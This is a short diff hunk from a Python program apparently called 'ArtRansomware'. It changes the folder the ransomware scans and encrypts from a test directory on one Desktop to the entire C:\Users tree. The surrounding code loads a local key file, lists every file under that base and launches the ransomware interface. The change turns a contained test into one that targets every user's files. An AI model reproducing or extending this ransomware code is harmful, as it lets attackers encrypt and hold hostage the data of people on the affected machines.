@@ -167,7 +167,7 @@ def return_key():
     return open('key.key', 'rb').read()
 
 if __name__ == "__main__":
-    base_directory = r"C:\Users\Lenovo\OneDrive\Desktop\encrypt"
+    base_directory = r"C:\Users"
     allfiles1.searching_files(base_directory)
     files = allfiles1.file_list
     app = App("ArtRansomware Interface")
